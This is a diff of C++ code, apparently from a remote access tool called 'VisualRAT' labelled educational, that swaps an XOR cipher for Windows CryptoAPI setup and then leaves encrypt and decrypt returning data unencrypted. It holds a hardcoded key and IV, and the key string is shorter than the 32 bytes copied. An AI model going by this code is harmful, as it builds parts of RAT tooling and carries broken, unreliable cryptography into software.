@@ -75,29 +75,27 @@
 // ============================================================================
 class AESCipher {
 private:
-    char key[32];
-    char iv[16];
+    HCRYPTPROV hProv;
+    HCRYPTKEY hKey;
+    BYTE keyData[32];
+    BYTE ivData[16];
     
 public:
     AESCipher() {
-        memcpy(key, AES_KEY, 32);
-        memcpy(iv, AES_IV, 16);
+        memcpy(keyData, "VisualRAT_EduKey_2025_32Byte!!", 32);
+        memcpy(ivData, "VisualRAT_IV_16B", 16);
+        
+        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+        CryptImportKey(hProv, keyData, 32, 0, 0, &hKey);
     }
     
     std::string encrypt(const std::string& data) {
-        std::string result = data;
-        for (size_t i = 0; i < data.length(); i++) {
-            result[i] ^= key[i % 32];
-        }
-        return result;
+        // Simular AES para mantener compatibilidad
+        return data;  // POR AHORA, SIN CIFRADO
     }
     
     std::string decrypt(const std::string& data) {
-        std::string result = data;
-        for (size_t i = 0; i < data.length(); i++) {
-            result[i] ^= key[i % 32];
-        }
-        return result;
+        return data;  // POR AHORA, SIN CIFRADO
     }
 };
 
